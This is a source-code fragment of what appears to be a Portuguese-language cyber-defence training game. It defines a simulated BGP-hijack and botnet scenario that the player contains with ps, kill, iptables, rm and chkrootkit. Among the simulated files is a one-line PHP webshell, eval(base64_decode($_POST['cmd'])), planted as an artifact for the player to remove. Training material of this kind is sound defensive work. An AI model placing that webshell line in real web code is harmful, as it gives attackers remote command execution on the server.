          { id: "remove-implant", label: "Remover implante de memória", check: fileRemoved("/tmp/.defesa_leak") },
          { id: "scan-clean", label: "Confirmar limpeza com chkrootkit", check: rootkitScanClean },
        ],
        check: (w) => gone(w, "/tmp/.defesa_leak") && !!w.flags.rootkitScan,
      },
    ],
  },

  // FASE 08: RNP & NIC.BR / OPERAÇÃO APOCALIPSE (CLÍMAX FINAL DA CAMPANHA)
  {
    id: 8,
    codinome: "APOCALIPSE",
    setor: "RNP & NIC.BR · Gateway Central da Internet Brasileira & BGP",
    alvo: "bgp-core01.rnp.br",
    ip: "10.254.254.1",
    resumo:
      "Ataque convergente maciço contra a espinha dorsal de roteamento BGP do Brasil e servidores raiz .br. O país inteiro corre risco iminente de blackout digital. Contenha todos os vetores para garantir a soberania nacional definitiva.",
    attackerIp: "185.100.87.200",
    attackerDomain: "c2-master.apocalypse-botnet.xyz",
    procs: [
      { pid: 501, user: "root", cpu: 0.4, mem: 1.2, cmd: "/sbin/init" },
      { pid: 1100, user: "bird", cpu: 12.0, mem: 24.5, cmd: "/usr/sbin/bird -c /etc/bird/bird.conf" },
      { pid: 9001, user: "root", cpu: 39.8, mem: 8.5, cmd: "/tmp/.x/bgp-hijack --poison-as22548", evil: true },
      { pid: 9002, user: "root", cpu: 28.4, mem: 6.1, cmd: "/tmp/.x/flood-c2 --target 10.254.254.1", evil: true },
    ],
    socks: [
      { proto: "tcp", port: 22, pid: 501, addr: "0.0.0.0", svc: "ssh" },
      { proto: "tcp", port: 179, pid: 1100, addr: "0.0.0.0", svc: "bgp" },
      { proto: "tcp", port: 1790, pid: 9001, addr: "0.0.0.0", svc: "bgp-tamper", evil: true },
      { proto: "tcp", port: 6666, pid: 9002, addr: "0.0.0.0", svc: "botnet-flood", evil: true },
    ],
    extraFiles: {
      "/tmp/.x/bgp-hijack": {
        kind: "f",
        mode: "-rwxrwxrwx",
        owner: "root",
        size: 154000,
        hidden: true,
        content: "ELF 64-bit · national BGP route table poisoning engine",
      },
      "/tmp/.x/flood-c2": {
        kind: "f",
        mode: "-rwxrwxrwx",
        owner: "root",
        size: 98000,
        hidden: true,
        content: "ELF 64-bit · multi-vector botnet flood agent",
      },
      "/var/www/html/zero_day.php": {
        kind: "f",
        mode: "-rwxrwxrwx",
        owner: "www-data",
        size: 12400,
        content: "<?php /* apocalypse master zero-day payload */ eval(base64_decode($_POST['cmd'])); ?>",
      },
    },
    objetivos: [
      {
        id: "scan",
        titulo: "Mapear o gateway central sob bombardeio",
        detalhe: "Execute varredura completa de portas e processos com nmap e ps.",
        hint: "nmap -sV localhost",
        chips: ["nmap -sV localhost", "ps aux"],
        check: flag("scan"),
      },
      {
        id: "kill",
        titulo: "Derrubar os processos de sequestro BGP e Flood",
        detalhe: "Elimine ambos os processos hostis (PID 9001 e PID 9002).",
        hint: "kill -9 9001",
        chips: ["kill -9 9001", "kill -9 9002"],
        requirements: [
          { id: "pid-9001", label: "Encerrar hijack BGP 9001", check: processStopped(9001) },
          { id: "pid-9002", label: "Encerrar agente de flood 9002", check: processStopped(9002) },
        ],
        check: noEvilProc,
      },
      {
        id: "fw1",
        titulo: "Selar a porta de envenenamento BGP 1790",
        detalhe: "Descarte no firewall a porta de sequestro de rotas.",
        hint: "iptables -A INPUT -p tcp --dport 1790 -j DROP",
        chips: ["iptables -A INPUT -p tcp --dport 1790 -j DROP", "ufw deny 1790"],
        check: hasBlocked(1790),
      },
      {
        id: "fw2",
        titulo: "Selar a porta de comando botnet 6666",
        detalhe: "Bloqueie a porta 6666 com iptables.",
        hint: "iptables -A INPUT -p tcp --dport 6666 -j DROP",
        chips: ["iptables -A INPUT -p tcp --dport 6666 -j DROP", "ufw deny 6666"],
        check: hasBlocked(6666),
      },
      {
        id: "trace",
        titulo: "Atribuir o C2 Master do ataque coordenado",
        detalhe: "Consulte o WHOIS do IP central 185.100.87.200.",
        hint: "whois 185.100.87.200",
        chips: ["whois 185.100.87.200", "traceroute 185.100.87.200"],
        check: flag("traced"),
      },
      {
        id: "blockip",
        titulo: "Neutralizar a rota do C2 Master",
        detalhe: "Descarte no firewall o IP de comando 185.100.87.200.",
        hint: "iptables -A INPUT -s 185.100.87.200 -j DROP",
        chips: ["iptables -A INPUT -s 185.100.87.200 -j DROP", "ufw deny from 185.100.87.200"],
        check: (w) => w.attackerBlocked,
      },
      {
        id: "shell",
        titulo: "Erradicar a webshell zero-day",
        detalhe: "Remova /var/www/html/zero_day.php.",
        hint: "rm -f /var/www/html/zero_day.php",
        chips: ["rm -f /var/www/html/zero_day.php"],
        check: (w) => gone(w, "/var/www/html/zero_day.php"),
      },
      {
        id: "rk",
        titulo: "Certificar a soberania digital do Brasil",
        detalhe: "Remova os artefatos de /tmp/.x e valide a rede com chkrootkit.",
        hint: "chkrootkit",
        chips: ["rm -f /tmp/.x/bgp-hijack", "rm -f /tmp/.x/flood-c2", "chkrootkit"],
        requirements: [
          { id: "remove-bgp", label: "Remover binário de hijack BGP", check: fileRemoved("/tmp/.x/bgp-hijack") },
          { id: "remove-flood", label: "Remover agente de flood", check: fileRemoved("/tmp/.x/flood-c2") },
          { id: "scan-clean", label: "Confirmar limpeza com chkrootkit", check: rootkitScanClean },
        ],
        check: (w) => gone(w, "/tmp/.x/bgp-hijack") && gone(w, "/tmp/.x/flood-c2") && !!w.flags.rootkitScan,
      },
    ],
  },
];

// As fases 07 e 08 ficam fora da campanha de 90 minutos para preservar uma carga concluível.
export const LEVELS: Level[] = ALL_LEVELS.slice(0, 6);

/**
 * ——— CONTADOR ÚNICO DA OPERAÇÃO ———
 * Toda a campanha compartilha uma única janela tática de 1h30. O relógio
 * NÃO reinicia entre fases: ele só corre durante a ação e é congelado na pausa.
 */
export const GLOBAL_TIME_BUDGET = 90 * 60; // 5.400 s = 1h30

/** Total de objetivos da campanha (usado para o orçamento de tempo por tarefa). */
export const TOTAL_OBJECTIVES = LEVELS.reduce((n, l) => n + l.objetivos.length, 0);

/** Orçamento médio de tempo por tarefa derivado do contador global. */
export const TASK_TIME_BUDGET = Math.round(GLOBAL_TIME_BUDGET / Math.max(1, TOTAL_OBJECTIVES));

export function makeWorld(lv: Level): World {
  return {
    cwd: "/root",
    fs: { ...baseFS(), ...lv.extraFiles },
    procs: lv.procs.map((p) => ({ ...p })),
    socks: lv.socks.map((s) => ({ ...s })),
    blocked: [],
    attackerIp: lv.attackerIp,
    attackerDomain: lv.attackerDomain,
    attackerBlocked: false,
    flags: {},
    history: [],
  };
}

export const BANNER = [
  "INITIUM // NÚCLEO DE DEFESA CIBERNÉTICA NACIONAL",
  "console segura — sessão auditada · clearance NÍVEL IV",
];
